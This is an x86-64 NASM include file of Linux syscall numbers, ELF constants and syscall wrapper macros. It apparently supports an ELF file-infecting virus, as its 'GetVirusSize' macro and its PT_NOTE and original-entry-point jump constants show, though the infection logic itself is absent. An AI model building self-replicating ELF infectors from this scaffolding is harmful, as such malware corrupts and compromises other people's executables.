; SYSCALLS >----------------------------------------------------------------<

%define SYS_READ        0x0000
%define SYS_WRITE       0x0001
%define SYS_OPEN        0x0002
%define SYS_CLOSE       0x0003
%define SYS_FSTAT       0x0005
%define SYS_MMAP        0x0009
%define SYS_MUNMAP      0x000B
%define SYS_MSYNC       0x001a
%define SYS_EXIT        0x003c
%define SYS_FSYNC       0x004a
%define SYS_TRUNCATE    0x004c
%define SYS_FTRUNCATE   0x004d
%define SYS_GETDENTS64  0x00d9

; FLAGS >-------------------------------------------------------------------<

%define O_RDONLY        0x0000
%define O_RDWR          0x0002
%define DT_REG          0x0008
%define MAP_SHARED      0x0001
%define PROT_READ       0x0001
%define PROT_WRITE      0x0002
%define PROT_READWRITE  0x0003
%define MS_SYNC         0x0004

; MAGIC-NUMBERS >-----------------------------------------------------------<

%define SZ_DENT         0x0400
%define SZ_JMP_OEP      0x000C

%define ELF_MAGIC       0x464c457f
%define ELF_LENDIAN     0x0001
%define ELF_64BIT       0x0002
%define ELF_AMD64       0x003e

%define PT_LOAD         0x0001
%define PT_NOTE         0x0004
%define PT_FLAG_RX      0x0005

%define STDOUT          0x0001

; WRAPPERS >----------------------------------------------------------------<

%macro GetVirusSize 0
  mov   rcx,  VExitRoutine
  mov   rbx,  _start
  sub   rcx,  rbx           ; rcx = size V-Body
%endmacro

%macro Write 3
  mov   rdi,  %1          ; fd
  mov   rsi,  %2          ; msg
  mov   rdx,  %3          ; len
  mov   rax,  SYS_WRITE
  syscall
%endmacro

%macro FSync 1
  mov   rdi,  %1                  ; fd
  mov   rax,  SYS_FSYNC
  syscall
%endmacro

%macro MSync 3
  mov   rdi,  %1                  ; addr
  mov   rsi,  %2                  ; len
  mov   rdx,  %3                  ; flag
  mov   rax,  SYS_MSYNC
  syscall
%endmacro

%macro FStat 2 
  mov   rdi,  %1                  ; 1st arg: fd
  mov   rsi,  %2                  ; 2nd arg: Buffer
  mov   rax,  SYS_FSTAT
  syscall
%endmacro

%macro FTruncate 2
  mov   rdi,  %1                  ; fd
  mov   rsi,  %2                  ; len
  mov   rax,  SYS_FTRUNCATE
  syscall
%endmacro

%macro Truncate 2
  mov   rdi,  %1                  ; path
  mov   rsi,  %2                  ; len
  mov   rax,  SYS_TRUNCATE
  syscall
%endmacro

%macro Open 3                     ; open(filename, flags)
  mov   rdi,  %1                  ; 1st arg: filename pointer
  mov   rsi,  %2                  ; 2nd arg: flags
  mov   rdx,  %3                  ; 3rd arg: mode
  mov   rax,  SYS_OPEN            ; syscall number
  syscall
%endmacro

%macro Read 3
  mov   rdi,  %1                  ; fd
  mov   rsi,  %2                  ; buf
  mov   rdx,  %3                  ; count
  mov   rax,  SYS_READ
  syscall
%endmacro

%macro GetDents64 3
  mov   rdi,  %1                  ; 1st arg: fd of directory
  mov   rsi,  %2                  ; 2nd arg: out buffer
  mov   rdx,  %3                  ; 3rd arg: sizeof buffer
  mov   rax,  SYS_GETDENTS64
  syscall
%endmacro

%macro Close 1
  mov   rdi,  %1                  ; 1st arg: fd
  mov   rax,  SYS_CLOSE           ; close(fd)
  syscall
%endmacro

%macro Exit 1
  mov   rdi,  %1                  ; Return value = 0
  mov   rax,  SYS_EXIT            ; sys_exit
  syscall
%endmacro

%macro MMap 3
  xor   rdi,  rdi                 ; NULL
  mov   rsi,  %1                  ; size
  mov   rdx,  %2                  ; protection
  mov   r10,  MAP_SHARED          ; access 
  mov   r8,   %3                  ; fd
  xor   r9,   r9                  ; 0
  mov   rax,  SYS_MMAP
  syscall
%endmacro

%macro MUnMap 2
  mov   rdi,  %1                  ; region
  mov   rsi,  %2                  ; size
  mov   rax,  SYS_MUNMAP
  syscall
%endmacro

